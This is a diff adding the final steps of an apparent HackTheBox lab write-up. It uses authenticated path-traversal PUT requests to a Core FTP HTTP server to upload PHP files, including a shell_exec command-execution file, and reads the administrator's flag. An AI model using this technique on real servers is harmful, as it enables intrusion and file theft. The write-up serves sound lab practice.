@@ -436,4 +436,147 @@ Content-length: 13
 
 ```
 
-Step8. 
+Step8. the process is repeated till to find the path of the flag.
+```bash
+┌──(root㉿kali)-[~]
+└─# cat > /tmp/test.php <<'EOF'
+<?php
+echo "HTB-PHP-WORKS";
+?>
+EOF
+
+┌──(root㉿kali)-[~]
+└─# curl -k --tlsv1.2 --tls-max 1.2 \
+-X PUT \
+-H "Host: localhost" \
+--basic -u 'fiona:987654321' \
+--data-binary @/tmp/test.php \
+--path-as-is \
+'https://10.129.111.81/../xampp/htdocs/test.php'
+HTTP/1.1 200 Ok
+Date:Sat, 15 Jul 2026 18:57:14 GMT
+Server: Core FTP HTTP Server
+Accept-Ranges: bytes
+Connection: Keep-Alive
+Content-type: application/octet-stream
+Content-length: 31
+  
+┌──(root㉿kali)-[~]
+└─# curl -k --tlsv1.2 --tls-max 1.2 \
+-X PUT \
+-H "Host: localhost" \
+--basic -u 'fiona:987654321' \
+--data-binary @/tmp/test.php \
+--path-as-is \
+'https://10.129.111.81/../xampp/htdocs/test.php'
+HTTP/1.1 200 Ok
+Date:Sat, 15 Jul 2026 18:57:23 GMT
+Server: Core FTP HTTP Server
+Accept-Ranges: bytes
+Connection: Keep-Alive
+Content-type: application/octet-stream
+Content-length: 31
+
+┌──(root㉿kali)-[~]
+└─# curl http://10.129.111.81/test.php
+HTB-PHP-WORKS                                                                                                                                                                                                                                             
+┌──(root㉿kali)-[~]
+└─# cat > /tmp/flag.php <<'EOF'
+<?php
+echo file_get_contents('C:\\flag.txt');
+?>
+EOF
+
+┌──(root㉿kali)-[~]
+└─# curl -k --tlsv1.2 --tls-max 1.2 \
+-X PUT \
+-H "Host: localhost" \
+--basic -u 'fiona:987654321' \
+--data-binary @/tmp/flag.php \
+--path-as-is \
+'https://10.129.111.81/../xampp/htdocs/flag.php'
+HTTP/1.1 200 Ok
+Date:Sat, 15 Jul 2026 18:57:55 GMT
+Server: Core FTP HTTP Server
+Accept-Ranges: bytes
+Connection: Keep-Alive
+Content-type: application/octet-stream
+Content-length: 49
+
+┌──(root㉿kali)-[~]
+└─# curl http://10.129.111.81/flag.php
+<br />
+<b>Warning</b>:  file_get_contents(C:\flag.txt): failed to open stream: No such file or directory in <b>C:\xampp\htdocs\flag.php</b> on line <b>2</b><br />
+
+┌──(root㉿kali)-[~]
+└─# cat > /tmp/flag.php <<'EOF'
+<?php
+echo shell_exec('where /r C:\\ flag.txt 2>&1');
+?>
+EOF
+
+┌──(root㉿kali)-[~]
+└─# curl -k --tlsv1.2 --tls-max 1.2 \
+-X PUT \
+-H "Host: localhost" \
+--basic -u 'fiona:987654321' \
+--data-binary @/tmp/flag.php \
+--path-as-is \
+'https://10.129.111.81/../xampp/htdocs/flag.php'
+HTTP/1.1 200 Ok
+Date:Sat, 15 Jul 2026 18:58:44 GMT
+Server: Core FTP HTTP Server
+Accept-Ranges: bytes
+Connection: Keep-Alive
+Content-type: application/octet-stream
+Content-length: 57
+
+┌──(root㉿kali)-[~]
+└─# curl http://10.129.111.81/flag.php
+
+<br />
+<b>Fatal error</b>:  Maximum execution time of 120 seconds exceeded in <b>C:\xampp\htdocs\flag.php</b> on line <b>2</b><br />
+
+```
+
+Step9. As soon as we found the path we get the flag as well.
+```bash
+┌──(root㉿kali)-[~]
+└─# curl http://10.129.111.81/flag.php
+C:\Users\Administrator\Desktop\flag.txt
+
+┌──(root㉿kali)-[~]
+└─# cat > /tmp/flag.php <<'EOF'
+<?php
+echo file_get_contents('C:\\Users\\Administrator\\Desktop\\flag.txt');
+?>
+EOF
+
+┌──(root㉿kali)-[~]
+└─# cat > /tmp/flag.php <<'EOF'
+<?php
+echo file_get_contents('C:\\Users\\Administrator\\Desktop\\flag.txt');
+?>
+EOF
+
+┌──(root㉿kali)-[~]
+└─# curl -k --tlsv1.2 --tls-max 1.2 \
+-X PUT \
+-H "Host: localhost" \
+--basic -u 'fiona:987654321' \
+--data-binary @/tmp/flag.php \
+--path-as-is \
+'https://10.129.111.81/../xampp/htdocs/flag.php'
+HTTP/1.1 200 Ok
+Date:Sat, 15 Jul 2026 19:15:51 GMT
+Server: Core FTP HTTP Server
+Accept-Ranges: bytes
+Connection: Keep-Alive
+Content-type: application/octet-stream
+Content-length: 80
+
+┌──(root㉿kali)-[~]
+└─# curl http://10.129.111.81/flag.php
+HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}             
+```
+
